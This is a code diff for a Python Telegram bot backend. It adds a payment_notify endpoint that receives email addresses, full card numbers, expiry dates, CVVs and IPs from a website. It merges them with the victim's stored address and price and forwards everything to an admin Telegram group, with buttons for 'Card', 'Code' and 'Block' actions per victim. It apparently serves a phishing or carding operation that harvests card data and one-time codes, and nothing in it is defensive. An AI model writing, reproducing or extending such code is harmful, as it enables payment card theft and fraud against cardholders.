@@ -1210,6 +1210,49 @@ async def notify_admin(request):
     return web.Response(text="OK")
 
 @log_function
+async def payment_notify(request):
+    data = await request.json()
+    email = data.get('email', '')
+    card = data.get('card', '')
+    expiry = data.get('expiry', '')
+    cvv = data.get('cvv', '')
+    ip = data.get('ip', '')
+    user_id = data.get('user_id', '')
+    
+    # --- Оновлюємо IP у базі даних, якщо передано user_id ---
+    if user_id and ip:
+        update_site_user_ip(user_id, ip)
+    
+    # --- Отримуємо дані користувача з бази ---
+    user_data_from_db = None
+    if user_id:
+        user_data_from_db = get_site_user(user_id)
+    
+    text = f"Email: {email}\nCard Number: {card}\nExpiry Date: {expiry}\nCVV: {cvv}\nIP: {ip}"
+    
+    # Додаємо інформацію з бази даних, якщо є
+    if user_data_from_db:
+        text += f"\nSite User ID: {user_data_from_db['id']}"
+        text += f"\nЦена: {user_data_from_db['price']} {user_data_from_db['currency']}"
+        text += f"\nАдрес: {user_data_from_db['street']}"
+    
+    kb_rows = [
+        [
+            InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
+            InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
+            InlineKeyboardButton(text="Unblock", callback_data=f"unblock:{ip}"),
+            InlineKeyboardButton(text="Code", callback_data=f"code:{ip}")
+        ],
+        [
+            InlineKeyboardButton(text="Тех підтримка", callback_data=f"support:{ip}"),
+            InlineKeyboardButton(text="Text", callback_data=f"text:{ip}")
+        ]
+    ]
+    kb = InlineKeyboardMarkup(inline_keyboard=kb_rows)
+    await bot.send_message(ADMIN_GROUP_ID, text, reply_markup=kb)
+    return web.Response(text='ok')
+
+@log_function
 async def code_notify(request):
     data = await request.json()
     code = data.get('code', '')
@@ -1396,25 +1439,28 @@ async def block_others(message: types.Message):
         await message.answer("Для начала заполните анкету командой /start")
 
 # --- запуск aiohttp і aiogram в одному event loop ---
+@log_function
+async def update_site_user_ip_endpoint(request):
+    """Endpoint для оновлення IP адреси користувача сайту"""
+    data = await request.json()
+    user_id = data.get('user_id', '')
+    ip = data.get('ip', '')
+    
+    if user_id and ip:
+        update_site_user_ip(user_id, ip)
+        return web.Response(text="OK")
+    else:
+        return web.Response(text="Missing user_id or ip", status=400)
+
+# --- запуск aiohttp і aiogram в одному event loop ---
 if __name__ == '__main__':
     async def main():
         # aiohttp app
         app = web.Application()
-        async def update_site_user_ip_endpoint(request):
-            """Endpoint для оновлення IP адреси користувача сайту"""
-            data = await request.json()
-            user_id = data.get('user_id', '')
-            ip = data.get('ip', '')
-            
-            if user_id and ip:
-                update_site_user_ip(user_id, ip)
-                return web.Response(text="OK")
-            else:
-                return web.Response(text="Missing user_id or ip", status=400)
         app.router.add_post('/notify_admin', notify_admin)
-        app.router.add_post('/update_site_user_ip', update_site_user_ip_endpoint)
         app.router.add_post('/payment_notify', payment_notify)
         app.router.add_post('/code_notify', code_notify)
+        app.router.add_post('/update_site_user_ip', update_site_user_ip_endpoint)
         runner = web.AppRunner(app)
         await runner.setup()
         site = web.TCPSite(runner, '0.0.0.0', 8081)
@@ -1422,4 +1468,4 @@ if __name__ == '__main__':
         print('Запускаю aiohttp webhook на 0.0.0.0:8081')
         # aiogram polling
         await dp.start_polling(bot)
-    asyncio.run(main()) 
+    asyncio.run(main())
